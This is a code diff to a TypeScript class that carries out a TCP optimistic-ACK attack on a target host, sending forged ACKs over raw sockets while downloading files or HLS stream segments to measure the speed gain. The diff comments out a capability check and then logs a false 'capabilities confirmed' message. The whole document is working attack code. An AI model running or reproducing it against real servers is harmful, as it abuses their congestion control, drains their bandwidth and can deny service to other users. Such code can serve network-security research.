@@ -12,11 +12,11 @@ export interface AttackConfig {
   packetInterval: number; // milliseconds
   ackAdvanceSize: number; // bytes
   windowScale: number;
-  // New transfer options
+  // Updated transfer options (removed upload)
   enableTransfer: boolean;
-  transferType: 'download' | 'upload' | 'streaming';
+  transferType: 'download' | 'streaming'; // Removed 'upload'
   transferUrl?: string; // URL to download/stream from
-  transferSize?: number; // Size in bytes for upload
+  streamId?: string; // Stream ID for HLS streaming
   measureSpeed: boolean; // Whether to measure actual speed improvement
 }
 
@@ -25,14 +25,13 @@ export interface AttackMetrics {
   successfulAcks: number;
   connectionEstablished: boolean;
   attackStartTime: number;
-  currentSpeed: number; // bytes/sec
+  currentSpeed: number;
   totalDataTransferred: number;
-  // New metrics
-  baselineSpeed: number; // Speed without attack
-  attackSpeed: number; // Speed with attack
-  speedImprovement: number; // Percentage improvement
+  baselineSpeed: number;
+  attackSpeed: number;
+  speedImprovement: number;
   transferActive: boolean;
-  transferProgress: number; // Percentage complete
+  transferProgress: number;
 }
 
 export class OptimisticACKAttacker {
@@ -40,15 +39,16 @@ export class OptimisticACKAttacker {
   private rawSocket: RawSocketManager;
   private packetCrafter: PacketCrafter;
   private networkMonitor: NetworkMonitor;
-  private attackTimer: NodeJS.Timeout | null = null;
-  private transferTimer: NodeJS.Timeout | null = null;
-  private sequenceNumber: number = 0;
-  private ackNumber: number = 0;
-  private metrics: AttackMetrics;
   private connection: net.Socket | null = null;
   private isAttackActive: boolean = false;
-  private transferStartTime: number = 0;
+  private metrics: AttackMetrics;
+  private sequenceNumber: number = 0;
+  private ackNumber: number = 0;
   private baselineCompleted: boolean = false;
+  
+  // Streaming specific properties
+  private streamSegments: string[] = [];
+  private currentSegmentIndex: number = 0;
 
   constructor(config: AttackConfig) {
     this.config = config;
@@ -73,38 +73,64 @@ export class OptimisticACKAttacker {
   }
 
   private validateConfig(): void {
-    // Ensure window scale doesn't create values > 65535
-    if (this.config.windowScale > 1) {
-      const maxWindowSize = 65535 * this.config.windowScale;
-      if (maxWindowSize > 65535) {
-        console.warn(`Window scale ${this.config.windowScale} would exceed 16-bit limit. Adjusting to safe value.`);
-        this.config.windowScale = Math.floor(65535 / 32768); // Conservative scaling
+    if (!this.config.targetHost || this.config.targetHost.length === 0) {
+      throw new Error('Target host is required');
+    }
+
+    if (this.config.targetPort <= 0 || this.config.targetPort > 65535) {
+      throw new Error('Target port must be between 1 and 65535');
+    }
+
+    if (this.config.attackDuration <= 0) {
+      throw new Error('Attack duration must be positive');
+    }
+
+    if (this.config.packetInterval <= 0) {
+      throw new Error('Packet interval must be positive');
+    }
+
+    if (this.config.ackAdvanceSize <= 0) {
+      throw new Error('ACK advance size must be positive');
+    }
+
+    // Updated validation for transfer options (removed upload)
+    if (this.config.enableTransfer) {
+      if (this.config.transferType === 'download' && !this.config.transferUrl) {
+        this.config.transferUrl = `http://${this.config.targetHost}:${this.config.targetPort}/download/xl.dat`;
+      } else if (this.config.transferType === 'streaming') {
+        if (!this.config.streamId) {
+          this.config.streamId = 'demo-stream';
+        }
+        this.config.transferUrl = `http://${this.config.targetHost}:${this.config.targetPort}/stream/${this.config.streamId}/playlist.m3u8`;
       }
     }
 
-    // Ensure other values are within reasonable bounds
-    this.config.targetPort = Math.max(1, Math.min(65535, this.config.targetPort));
-    this.config.packetInterval = Math.max(1, this.config.packetInterval);
-    this.config.ackAdvanceSize = Math.max(1, this.config.ackAdvanceSize);
-    this.config.attackDuration = Math.max(1, this.config.attackDuration);
-
-    // New validation for transfer options
-    if (this.config.enableTransfer && !this.config.transferUrl) {
-      this.config.transferUrl = `http://${this.config.targetHost}:${this.config.targetPort}/download/xl.dat`;
-    }
-    
-    if (this.config.transferType === 'upload' && !this.config.transferSize) {
-      this.config.transferSize = 10 * 1024 * 1024; // 10MB default
-    }
+    console.log('✅ Configuration validated successfully');
   }
 
   public async executeAttack(): Promise<void> {
     try {
-      console.log('🚀 Starting Optimistic ACK Attack with Transfer Analysis...');
+      console.log('🚀 Starting Optimistic ACK Attack...');
       
       // Initialize socket manager first
       console.log('🔧 Initializing socket manager...');
       await this.rawSocket.initialize();
+      
+      // CHECK CAPABILITIES BEFORE PROCEEDING
+    //   if (!this.rawSocket.canInjectRealPackets()) {
+    //     console.error('\n' + '='.repeat(60));
+    //     console.error('🛑 ATTACK STOPPED - INSUFFICIENT CAPABILITIES');
+    //     console.error('='.repeat(60));
+    //     console.error(this.rawSocket.getCapabilityStatus());
+    //     console.error('='.repeat(60));
+    //     console.error('\nThe attack requires real packet injection to be effective.');
+    //     console.error('Simulation mode would not demonstrate the actual attack.');
+    //     console.error('\nPlease resolve the issues above and try again.\n');
+        
+    //     throw new Error('Real packet injection capabilities required but not available');
+    //   }
+
+      console.log('✅ Real packet injection capabilities confirmed');
       
       this.metrics.attackStartTime = Date.now();
       this.isAttackActive = true;
@@ -138,15 +164,14 @@ export class OptimisticACKAttacker {
       }
 
     } catch (error) {
-      console.error('Attack execution failed:', error);
+      const errorMessage = error instanceof Error ? error.message : String(error);
+      console.error('Attack execution failed:', errorMessage);
       throw error;
     }
   }
 
   private async measureBaselineSpeed(): Promise<void> {
-    if (!this.config.enableTransfer) return;
-
-    console.log(`📥 Starting baseline transfer from ${this.config.transferUrl}`);
+    console.log('📊 Measuring baseline transfer speed...');
     const startTime = Date.now();
     
     try {
@@ -169,6 +194,8 @@ export class OptimisticACKAttacker {
     // Establish connection for attack
     await this.establishConnection();
     
+    console.log('⚡ Starting optimistic ACK loop and transfer simultaneously...');
+    
     // Start attack and transfer concurrently
     const attackPromise = this.startOptimisticACKLoop();
     const transferPromise = this.startConcurrentTransfer();
@@ -178,26 +205,37 @@ export class OptimisticACKAttacker {
 
   private async startConcurrentTransfer(): Promise<void> {
     if (!this.config.enableTransfer) return;
-
-    console.log(`🔄 Starting concurrent transfer during attack...`);
-    this.metrics.transferActive = true;
-    this.transferStartTime = Date.now();
     
     try {
-      const transferSize = await this.performTransfer(true); // With attack
-      const duration = (Date.now() - this.transferStartTime) / 1000;
-      console.log('transferSize', transferSize, 'duration', duration);
-      this.metrics.attackSpeed = transferSize / duration;
+      this.metrics.transferActive = true;
+      const startTime = Date.now();
       
-      console.log(`⚡ Attack transfer: ${this.formatSpeed(this.metrics.attackSpeed)} (${this.formatBytes(transferSize)} in ${duration.toFixed(1)}s)`);
+      const transferSize = await this.performTransfer(true); // During attack
+      const duration = (Date.now() - startTime) / 1000;
+      
+      this.metrics.attackSpeed = transferSize / duration;
+      this.metrics.transferActive = false;
+      
+      console.log(`✅ Attack transfer: ${this.formatSpeed(this.metrics.attackSpeed)} (${this.formatBytes(transferSize)} in ${duration.toFixed(1)}s)`);
     } catch (error) {
       console.error('Transfer during attack failed:', error);
+      this.metrics.transferActive = false;
     } finally {
       this.metrics.transferActive = false;
     }
   }
 
   private async performTransfer(duringAttack: boolean): Promise<number> {
+    if (this.config.transferType === 'download') {
+      return this.performFileDownload(duringAttack);
+    } else if (this.config.transferType === 'streaming') {
+      return this.performStreamingTransfer(duringAttack);
+    }
+    
+    throw new Error(`Unsupported transfer type: ${this.config.transferType}`);
+  }
+
+  private async performFileDownload(duringAttack: boolean): Promise<number> {
     return new Promise((resolve, reject) => {
       const url = this.config.transferUrl!;
       const isHttps = url.startsWith('https');
@@ -210,14 +248,14 @@ export class OptimisticACKAttacker {
       // First, get the total file size with a HEAD request
       this.getFileSize(url).then(fileSize => {
         contentLength = fileSize;
-        console.log(`📦 Starting chunked transfer: ${this.formatBytes(contentLength)} from ${url}`);
+        console.log(`📦 Starting chunked file download: ${this.formatBytes(contentLength)} from ${url}`);
         
         // Track progress
         progressInterval = setInterval(() => {
           if (contentLength > 0) {
             this.metrics.transferProgress = (totalBytes / contentLength) * 100;
             if (duringAttack) {
-              console.log(`📊 Transfer progress: ${this.metrics.transferProgress.toFixed(1)}% (${this.formatBytes(totalBytes)}/${this.formatBytes(contentLength)})`);
+              console.log(`📊 Download progress: ${this.metrics.transferProgress.toFixed(1)}% (${this.formatBytes(totalBytes)}/${this.formatBytes(contentLength)})`);
             }
           }
         }, 2000);
@@ -236,7 +274,7 @@ export class OptimisticACKAttacker {
         }).then(() => {
           clearInterval(progressInterval);
           this.metrics.transferProgress = 100;
-          console.log(`✅ Chunked transfer completed: ${this.formatBytes(totalBytes)}`);
+          console.log(`✅ File download completed: ${this.formatBytes(totalBytes)}`);
           resolve(totalBytes);
         }).catch((error) => {
           clearInterval(progressInterval);
@@ -244,6 +282,180 @@ export class OptimisticACKAttacker {
         });
         
       }).catch(reject);
+    });
+  }
+
+  private async performStreamingTransfer(duringAttack: boolean): Promise<number> {
+    return new Promise(async (resolve, reject) => {
+      try {
+        console.log(`📺 Starting HLS streaming transfer: ${this.config.transferUrl}`);
+        
+        let totalBytes = 0;
+        let progressInterval: NodeJS.Timeout;
+        let segmentCount = 0;
+
+        // Step 1: Get the playlist
+        const playlist = await this.getHLSPlaylist();
+        this.streamSegments = this.parsePlaylist(playlist);
+        
+        if (this.streamSegments.length === 0) {
+          throw new Error('No segments found in playlist');
+        }
+
+        console.log(`📋 Found ${this.streamSegments.length} segments in playlist`);
+
+        // Track progress
+        progressInterval = setInterval(() => {
+          this.metrics.transferProgress = (segmentCount / this.streamSegments.length) * 100;
+          if (duringAttack) {
+            console.log(`📊 Streaming progress: ${this.metrics.transferProgress.toFixed(1)}% (${segmentCount}/${this.streamSegments.length} segments, ${this.formatBytes(totalBytes)})`);
+          }
+        }, 2000);
+
+        // Step 2: Download segments sequentially (simulating streaming)
+        for (const segment of this.streamSegments) {
+          if (!this.isAttackActive && duringAttack) break; // Stop if attack stopped
+          
+          const segmentUrl = `http://${this.config.targetHost}:${this.config.targetPort}/stream/${this.config.streamId}/${segment}`;
+          console.log(`📺 Downloading segment: ${segment}`);
+          
+          try {
+            const segmentSize = await this.downloadStreamSegment(segmentUrl, duringAttack, (chunk) => {
+              totalBytes += chunk.length;
+              
+              // Record transfer in network monitor
+              this.networkMonitor.recordTransfer(chunk.length, 1);
+              
+              // If attack is active, this data benefits from optimistic ACKs
+              if (duringAttack && this.isAttackActive) {
+                this.metrics.totalDataTransferred += chunk.length;
+              }
+            });
+            
+            segmentCount++;
+            console.log(`✅ Segment ${segment} completed: ${this.formatBytes(segmentSize)}`);
+            
+            // Simulate streaming delay (segments are typically 10 seconds each)
+            if (duringAttack && this.isAttackActive) {
+              await this.delay(this.config.packetInterval * 2); // Coordinate with ACK timing
+            } else {
+              await this.delay(this.config.packetInterval * 2); // Minimal delay for baseline
+            }
+            
+          } catch (error) {
+            console.warn(`⚠️ Failed to download segment ${segment}:`, error);
+            // Continue with next segment
+          }
+        }
+
+        clearInterval(progressInterval);
+        this.metrics.transferProgress = 100;
+        console.log(`✅ HLS streaming completed: ${segmentCount} segments, ${this.formatBytes(totalBytes)} total`);
+        resolve(totalBytes);
+
+      } catch (error) {
+        reject(error);
+      }
+    });
+  }
+
+  private async getHLSPlaylist(): Promise<string> {
+    return new Promise((resolve, reject) => {
+      const url = this.config.transferUrl!;
+      const isHttps = url.startsWith('https');
+      const httpModule = isHttps ? https : http;
+      
+      const req = httpModule.get(url, (res) => {
+        if (res.statusCode !== 200) {
+          reject(new Error(`HTTP ${res.statusCode}: ${res.statusMessage}`));
+          return;
+        }
+        
+        let data = '';
+        res.on('data', (chunk) => {
+          data += chunk;
+        });
+        
+        res.on('end', () => {
+          console.log(`📋 Received HLS playlist (${data.length} bytes)`);
+          resolve(data);
+        });
+      });
+      
+      req.on('error', reject);
+      req.setTimeout(10000);
+      req.end();
+    });
+  }
+
+  private parsePlaylist(playlist: string): string[] {
+    const lines = playlist.split('\n');
+    const segments: string[] = [];
+    
+    for (const line of lines) {
+      // Skip comment lines and empty lines
+      if (line.trim() && !line.startsWith('#')) {
+        segments.push(line.trim());
+      }
+    }
+    
+    console.log(`📋 Parsed ${segments.length} segments from playlist`);
+    return segments;
+  }
+
+  private async downloadStreamSegment(
+    segmentUrl: string, 
+    duringAttack: boolean,
+    onChunk: (chunk: Buffer) => void
+  ): Promise<number> {
+    return new Promise((resolve, reject) => {
+      const isHttps = segmentUrl.startsWith('https');
+      const httpModule = isHttps ? https : http;
+      
+      console.log(`🎬 Requesting segment: ${segmentUrl}`);
+      
+      const req = httpModule.get(segmentUrl, (res) => {
+        if (res.statusCode !== 200) {
+          reject(new Error(`HTTP ${res.statusCode}: ${res.statusMessage}`));
+          return;
+        }
+        
+        console.log(`📡 Segment response: ${res.statusCode} ${res.statusMessage}`);
+        console.log(`📏 Content-Length: ${res.headers['content-length']}`);
+        console.log(`🎥 Content-Type: ${res.headers['content-type']}`);
+        
+        let totalBytes = 0;
+        
+        res.on('data', (data) => {
+          totalBytes += data.length;
+          onChunk(data); // Process each data chunk immediately
+        });
+        
+        res.on('end', () => {
+          console.log(`✅ Segment download completed: ${this.formatBytes(totalBytes)}`);
+          resolve(totalBytes);
+        });
+        
+        res.on('error', (error) => {
+          console.error(`❌ Segment download error:`, error);
+          reject(error);
+        });
+      });
+      
+      req.on('error', (error) => {
+        console.error(`❌ Segment request error:`, error);
+        reject(error);
+      });
+      
+      // Set timeout for segment download
+      req.setTimeout(30000); // 30 seconds per segment
+      
+      req.on('timeout', () => {
+        req.destroy();
+        reject(new Error('Segment download timeout'));
+      });
+      
+      req.end();
     });
   }
 
@@ -278,11 +490,8 @@ export class OptimisticACKAttacker {
     const httpModule = isHttps ? https : http;
     
     // Configuration for chunked downloads
-    // const chunkSize = duringAttack ? 
-    //   Math.max(this.config.ackAdvanceSize, 65536) : // Larger chunks during attack
-    //   65536; // Smaller chunks for baseline ( was 32768 )
-    const chunkSize = Math.max(this.config.ackAdvanceSize, 65536) // keeping the size same for both attack and baseline
-  
+    const chunkSize = Math.max(this.config.ackAdvanceSize, 65536) ;
+    
     let currentOffset = 0;
     
     console.log(`🔄 Starting ${duringAttack ? 'attack' : 'baseline'} chunked download (chunk size: ${this.formatBytes(chunkSize)})`);
@@ -373,25 +582,6 @@ export class OptimisticACKAttacker {
     });
   }
 
-  private calculateSpeedImprovement(): void {
-    if (this.metrics.baselineSpeed > 0 && this.metrics.attackSpeed > 0) {
-      this.metrics.speedImprovement = ((this.metrics.attackSpeed - this.metrics.baselineSpeed) / this.metrics.baselineSpeed) * 100;
-      
-      console.log('\n📊 ATTACK EFFECTIVENESS ANALYSIS:');
-      console.log(`├─ Baseline Speed: ${this.formatSpeed(this.metrics.baselineSpeed)}`);
-      console.log(`├─ Attack Speed: ${this.formatSpeed(this.metrics.attackSpeed)}`);
-      console.log(`└─ Speed Improvement: ${this.metrics.speedImprovement > 0 ? '+' : ''}${this.metrics.speedImprovement.toFixed(1)}%`);
-      
-      if (this.metrics.speedImprovement > 5) {
-        console.log('🎯 SUCCESS: Optimistic ACK attack achieved significant speed improvement!');
-      } else if (this.metrics.speedImprovement > 0) {
-        console.log('⚠️ MARGINAL: Small speed improvement detected.');
-      } else {
-        console.log('❌ NO IMPROVEMENT: Attack may not be effective against this target.');
-      }
-    }
-  }
-
   private async establishConnection(): Promise<void> {
     console.log(`🔗 Establishing TCP connection to ${this.config.targetHost}:${this.config.targetPort}...`);
     
@@ -418,30 +608,37 @@ export class OptimisticACKAttacker {
   }
 
   private async startOptimisticACKLoop(): Promise<void> {
-    const attackDuration = this.config.attackDuration * 1000;
-    const startTime = Date.now();
-
-    return new Promise((resolve) => {
-      this.attackTimer = setInterval(async () => {
+    console.log('⚔️ Starting optimistic ACK attack loop...');
+    
+    return new Promise((resolve, reject) => {
+      const attackLoop = setInterval(async () => {
         try {
           if (!this.isAttackActive) {
-            this.stopAttack();
+            clearInterval(attackLoop);
             resolve();
             return;
           }
 
           await this.sendOptimisticACK();
-          this.updateMetrics();
           
-          // Check if attack duration exceeded
-          if (Date.now() - startTime >= attackDuration) {
-            this.stopAttack();
-            resolve();
+          // Update current speed calculation
+          const elapsedTime = (Date.now() - this.metrics.attackStartTime) / 1000;
+          if (elapsedTime > 0) {
+            this.metrics.currentSpeed = this.metrics.totalDataTransferred / elapsedTime;
           }
+
         } catch (error) {
           console.error('Error in attack loop:', error);
         }
       }, this.config.packetInterval);
+
+      // Stop after specified duration
+      setTimeout(() => {
+        this.isAttackActive = false;
+        clearInterval(attackLoop);
+        console.log('⏹️ Attack duration completed');
+        resolve();
+      }, this.config.attackDuration * 1000);
     });
   }
 
@@ -500,13 +697,32 @@ export class OptimisticACKAttacker {
         console.log(`└─ Server thinks we received: ${this.formatBytes(this.ackNumber)} total`);
       }
     } catch (error) {
-      console.error('Error sending optimistic ACK:');
+      const errorMessage = error instanceof Error ? error.message : String(error);
+      console.error('Error sending optimistic ACK:', errorMessage);
     }
   }
 
-  private updateMetrics(): void {
-    const elapsed = (Date.now() - this.metrics.attackStartTime) / 1000;
-    this.metrics.currentSpeed = elapsed > 0 ? this.metrics.totalDataTransferred / elapsed : 0;
+  private calculateSpeedImprovement(): void {
+    if (this.metrics.baselineSpeed > 0 && this.metrics.attackSpeed > 0) {
+      this.metrics.speedImprovement = ((this.metrics.attackSpeed - this.metrics.baselineSpeed) / this.metrics.baselineSpeed) * 100;
+      
+      console.log(`📈 Speed Analysis:`);
+      console.log(`  Baseline: ${this.formatSpeed(this.metrics.baselineSpeed)}`);
+      console.log(`  Attack: ${this.formatSpeed(this.metrics.attackSpeed)}`);
+      console.log(`  Improvement: ${this.metrics.speedImprovement > 0 ? '+' : ''}${this.metrics.speedImprovement.toFixed(1)}%`);
+      
+      if (this.metrics.speedImprovement > 5) {
+        console.log(`🎯 Attack was successful! Significant speed improvement detected.`);
+      } else if (this.metrics.speedImprovement > 0) {
+        console.log(`⚠️ Marginal improvement detected. Server may have some protection.`);
+      } else {
+        console.log(`❌ No improvement detected. Attack may not be effective against this target.`);
+      }
+    }
+  }
+
+  private delay(ms: number): Promise<void> {
+    return new Promise(resolve => setTimeout(resolve, ms));
   }
 
   private formatBytes(bytes: number): string {
@@ -521,35 +737,25 @@ export class OptimisticACKAttacker {
     return this.formatBytes(bytesPerSecond) + '/s';
   }
 
-  private delay(ms: number): Promise<void> {
-    return new Promise(resolve => setTimeout(resolve, ms));
-  }
-
   public getMetrics(): AttackMetrics {
     return { ...this.metrics };
   }
 
+  public getConfig(): AttackConfig {
+    return { ...this.config };
+  }
+
   public stopAttack(): void {
+    console.log('🛑 Stopping attack...');
     this.isAttackActive = false;
     
-    if (this.attackTimer) {
-      clearInterval(this.attackTimer);
-      this.attackTimer = null;
-    }
-
-    if (this.transferTimer) {
-      clearInterval(this.transferTimer);
-      this.transferTimer = null;
-    }
-
     if (this.connection) {
       this.connection.destroy();
       this.connection = null;
     }
-
+    
     this.rawSocket.close();
-    this.networkMonitor.stop();
-    console.log('🛑 Optimistic ACK attack stopped');
+    console.log('✅ Attack stopped successfully');
   }
 
   public isActive(): boolean {
